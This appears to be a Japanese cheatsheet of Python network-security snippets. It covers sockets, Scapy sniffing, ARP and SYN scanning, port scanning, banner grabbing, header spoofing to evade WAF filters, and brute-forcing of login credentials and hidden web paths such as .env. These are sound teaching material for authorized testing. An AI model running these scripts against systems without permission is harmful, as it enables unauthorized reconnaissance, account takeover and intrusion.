---
title: "Python Black Hat：ネットワーク＆セキュリティスクリプティング"
description: "ソケットプログラミング、Scapyパケット操作、HTTPリクエスト、ポートスキャンを網羅したPythonセキュリティスクリプティングのチートシート。ペネトレーションテスターやセキュリティ研究者に不可欠なコードスニペット集。"
date: 2026-02-10
tags: ["python", "cheatsheet", "penetration-testing", "security", "scripting"]
keywords: ["Pythonソケットプログラミング", "Scapyチートシート", "requestsライブラリPython", "Pythonハッキングスクリプト", "Pythonポートスキャナー", "Pythonネットワークセキュリティ", "Pythonペネトレーションテスト", "Scapyパケット作成", "Pythonリバースシェル", "Pythonセキュリティ自動化"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "Python Black Hat：ネットワーク＆セキュリティスクリプティング",
    "description": "ネットワークセキュリティ、ソケットプログラミング、Scapyパケット操作、HTTPリクエストのための必須Pythonスクリプト。",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "ja"
  }
---

## システム初期化

Pythonは攻撃的セキュリティの共通言語です。その可読性の高い構文、広範な標準ライブラリ、そして強力なサードパーティパッケージにより、偵察の自動化、カスタムエクスプロイトの作成、ネットワークツールの構築を必要とするペネトレーションテスター、レッドチーマー、セキュリティ研究者にとって最適なツールとなっています。生のソケットプログラミングからScapyによるパケット操作、Requestsによるウェブアプリケーションテストまで、Pythonはネットワークスタックの各レイヤーに対する完全な制御を提供します。このフィールドマニュアルには、最も一般的なセキュリティスクリプティングタスクのための実戦で検証されたコードスニペットが含まれています — 許可されたエンゲージメント中にコピー、適応、展開する準備ができています。

すべてのスクリプトは、許可されたセキュリティテストおよび教育目的のみを対象としています。

---

## ソケットネットワーキング

`socket`モジュールはPythonにおける低レベルネットワーキングインターフェースを提供します。TCPおよびUDP通信への直接アクセスを可能にし、カスタムクライアント、サーバー、ポートスキャナー、ネットワークツールをゼロから構築できます。ソケットの理解は基本です — すべての上位レベルのネットワーキングライブラリはソケットの上に構築されています。

### TCPクライアント

リモートホストへの接続を確立し、データを交換します。

```python
import socket

target_host = "www.google.com"
target_port = 80

# Create a socket object (IPv4, TCP)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target
client.connect((target_host, target_port))

# Send some data (HTTP GET request)
client.send(b"GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")

# Receive the response
response = client.recv(4096)

print(response.decode())
client.close()
```

### UDPクライアント

UDP（コネクションレスプロトコル）でデータを送信します。

```python
import socket

target_host = "127.0.0.1"
target_port = 9999

# Create a UDP socket
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send data (no connection needed)
client.sendto(b"AAABBBCCC", (target_host, target_port))

# Receive data
data, addr = client.recvfrom(4096)
print(data.decode())
client.close()
```

### TCPサーバー

着信接続をリッスンし、別々のスレッドでクライアントを処理します。

```python
import socket
import threading

bind_ip = "0.0.0.0"
bind_port = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip, bind_port))
server.listen(5)

print(f"[*] Listening on {bind_ip}:{bind_port}")

def handle_client(client_socket):
    request = client_socket.recv(1024)
    print(f"[*] Received: {request.decode()}")
    client_socket.send(b"ACK!")
    client_socket.close()

while True:
    client, addr = server.accept()
    print(f"[*] Accepted connection from: {addr[0]}:{addr[1]}")
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()
```

---

## Scapyパケット操作

ScapyはPythonにおけるパケット作成、スニッフィング、ネットワーク探索の究極のツールです。レイヤーごとにパケットを構築し、ネットワーク上に送信し、応答をキャプチャし、トラフィックを分析できます — すべてPythonスクリプトから実行可能です。`pip install scapy`でインストールしてください。

### パケットスニッフィング

ネットワークインターフェース上のライブトラフィックをキャプチャします。

```python
from scapy.all import sniff

def packet_callback(packet):
    print(packet.summary())

# Sniff 10 packets on the default interface
sniff(prn=packet_callback, count=10, store=0)
```

### パケットの作成と送信（ICMPピング）

カスタムICMPエコーリクエストを作成して送信します。

```python
from scapy.all import IP, ICMP, send, sr1

# Create and send an ICMP packet
packet = IP(dst="8.8.8.8") / ICMP()
send(packet)

# Send and wait for a response
response = sr1(packet, timeout=2, verbose=0)
if response:
    print(f"Reply from {response.src}: TTL={response.ttl}")
```

### ARPスキャナー（ネットワーク探索）

ARPリクエストを使用してローカルネットワーク上のすべてのアクティブなホストを検出します。

```python
from scapy.all import ARP, Ether, srp

target_ip = "192.168.1.0/24"

# Create ARP request packet
arp = ARP(pdst=target_ip)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether / arp

# Send and receive responses
result = srp(packet, timeout=3, verbose=0)[0]

print("IP Address\t\tMAC Address")
print("-" * 40)
for sent, received in result:
    print(f"{received.psrc}\t\t{received.hwsrc}")
```

### TCP SYNスキャン（ステルスポートスキャン）

ハンドシェイクを完了せずに開いているポートを検出するために、SYNパケットを手動で作成します。

```python
from scapy.all import IP, TCP, sr1, send

target_ip = "192.168.1.1"
target_port = 80

# Send SYN packet (flags="S")
packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
response = sr1(packet, timeout=1, verbose=0)

if response:
    if response[TCP].flags == 0x12:  # SYN-ACK
        print(f"Port {target_port} is OPEN")
        # Send RST to close connection cleanly
        send(IP(dst=target_ip) / TCP(dport=target_port, flags="R"), verbose=0)
    elif response[TCP].flags == 0x14:  # RST-ACK
        print(f"Port {target_port} is CLOSED")
else:
    print(f"Port {target_port} is FILTERED (no response)")
```

---

## HTTPリクエスト（セキュリティコンテキスト）

`requests`ライブラリは、ウェブアプリケーションテスト、APIファジング、自動偵察のためのHTTP通信を簡素化します。`pip install requests`でインストールしてください。

### カスタムヘッダー付きGETリクエスト

ヘッダーのなりすましにより、基本的なWAFルールやフィンガープリントフィルターを回避します。

```python
import requests

url = "http://target-site.com"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Cookie": "session_id=12345abcdef",
    "X-Forwarded-For": "127.0.0.1"
}

response = requests.get(url, headers=headers, timeout=10)
print(f"Status: {response.status_code}")
print(f"Server: {response.headers.get('Server', 'unknown')}")
```

### POSTリクエスト（ログインブルートフォース）

ログインフォームに対する自動資格情報テスト。

```python
import requests

target_url = "http://target-site.com/login"
usernames = ["admin", "root", "user"]
passwords = ["123456", "password", "admin123"]

for user in usernames:
    for pwd in passwords:
        data = {"username": user, "password": pwd}
        r = requests.post(target_url, data=data, timeout=10)

        if "Login failed" not in r.text:
            print(f"[+] Valid credentials: {user}:{pwd}")
            break
```

### ディレクトリブルートフォース

ウェブサーバー上の隠しパスやファイルを発見します。

```python
import requests

target = "http://target-site.com"
wordlist = [
    "admin", "login", "dashboard", "api", "config",
    "backup", "uploads", "db", ".env", "robots.txt"
]

for word in wordlist:
    url = f"{target}/{word}"
    r = requests.get(url, timeout=5)
    if r.status_code != 404:
        print(f"[{r.status_code}] {url}")
```

---

## シンプルポートスキャナー

標準ライブラリのソケットとスレッディングを使用したマルチスレッドTCPポートスキャナー。複数のスレッドに作業を分散させることで、最初の1024ポートを高速にスキャンします。

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
queue = Queue()
open_ports = []
print_lock = threading.Lock()

def portscan(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        sock.close()
        if result == 0:
            return True
        return False
    except Exception:
        return False

def worker():
    while not queue.empty():
        port = queue.get()
        if portscan(port):
            with print_lock:
                print(f"[+] Port {port} is open")
                open_ports.append(port)
        queue.task_done()

# Fill the queue with ports 1-1024
for port in range(1, 1025):
    queue.put(port)

# Launch threads
thread_list = []
for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    thread_list.append(t)
    t.start()

queue.join()
print(f"\n[*] Open ports: {open_ports}")
```

---

## バナーグラビング

開いているポートで実行されているサービスのバナーを読み取って識別します。

```python
import socket

def grab_banner(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except Exception:
        return None

target = "192.168.1.1"
ports = [21, 22, 25, 80, 443, 8080]

for port in ports:
    banner = grab_banner(target, port)
    if banner:
        print(f"[+] {target}:{port} — {banner}")
```
